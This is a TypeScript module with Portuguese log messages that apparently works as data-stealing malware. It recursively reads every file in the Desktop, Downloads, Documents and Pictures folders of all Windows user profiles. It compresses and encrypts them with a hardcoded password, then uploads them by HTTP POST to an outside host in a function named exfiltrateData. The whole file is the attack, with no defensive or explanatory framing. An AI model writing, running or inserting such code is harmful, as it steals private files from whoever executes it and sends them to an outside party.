import fs from 'fs';
import path from 'path';
import zlib from 'zlib';
import crypto from 'crypto';
import http from 'http';
import FormData from 'form-data';

function collectDataFromFolder(folderPath: any) {
  let collectedData: any = [];

  try {
    if (fs.existsSync(folderPath)) {
      const files = fs.readdirSync(folderPath);

      files.forEach((file: any) => {
        const filePath = path.join(folderPath, file);
        try {
          if (fs.statSync(filePath).isFile()) {
            collectedData.push(fs.readFileSync(filePath));
          } else if (fs.statSync(filePath).isDirectory()) {
            collectedData = collectedData.concat(
              collectDataFromFolder(filePath),
            );
          }
        } catch (error) {
          console.error(
            `Erro ao processar o arquivo/diretório ${filePath}:`,
            error,
          );
        }
      });
    }
  } catch (error) {
    console.error(`Erro ao acessar o diretório ${folderPath}:`, error);
  }

  return collectedData;
}

function collectDataFromUsers() {
  const usersData: any = [];
  try {
    const userProfiles = fs.readdirSync('C:\\Users');

    userProfiles.forEach((user: any) => {
      const userDirectory = path.join('C:\\Users', user);

      const foldersToCheck = ['Desktop', 'Downloads', 'Documents', 'Pictures'];

      foldersToCheck.forEach((folder) => {
        const folderPath = path.join(userDirectory, folder);
        try {
          const data = collectDataFromFolder(folderPath);
          usersData.push(...data);
        } catch (error) {
          console.error(`Erro ao coletar dados da pasta ${folderPath}:`, error);
        }
      });
    });
  } catch (error) {
    console.error('Erro ao listar perfis de usuários:', error);
  }

  return usersData;
}

function compressData(data: any) {
  try {
    return zlib.gzipSync(Buffer.concat(data));
  } catch (error) {
    console.error('Erro ao comprimir dados:', error);
    return null;
  }
}

function encryptData(data: any, password: any) {
  try {
    const algorithm = 'aes-256-cbc';
    const key = crypto.scryptSync(password, 'salt', 32);
    const iv = crypto.randomBytes(16);

    const cipher = crypto.createCipheriv(algorithm, key, iv);
    let encrypted = cipher.update(data);
    encrypted = Buffer.concat([encrypted, cipher.final()]);

    return { encrypted, iv };
  } catch (error) {
    console.error('Erro ao criptografar dados:', error);
    return null;
  }
}

function exfiltrateData(encryptedData: any, iv: any) {
  try {
    const form = new FormData();
    form.append('file', encryptedData, { filename: 'data.enc' });
    form.append('iv', iv.toString('hex'));

    const requestOptions = {
      method: 'POST',
      headers: form.getHeaders(),
    };

    const req = http.request(
      'http://tristao.io:3000/upload',
      requestOptions,
      (res) => {
        console.log(`Response status: ${res.statusCode}`);
      },
    );

    form.pipe(req);
  } catch (error) {
    console.error('Erro ao exfiltrar dados:', error);
  }
}

function execute() {
  const password = 'decrypt';

  try {
    const collectedData = collectDataFromUsers();
    console.log('Dados coletados de usuários:', collectedData.length);

    const compressedData = compressData(collectedData);
    if (compressedData) {
      console.log('Dados comprimidos.');

      const encryptedData = encryptData(compressedData, password);
      if (encryptedData) {
        console.log('Dados criptografados.');
        exfiltrateData(encryptedData.encrypted, encryptedData.iv);
        console.log('Dados exfiltrados.');
      }
    }
  } catch (error) {
    console.error('Erro durante a execução:', error);
  }
}

export default execute;
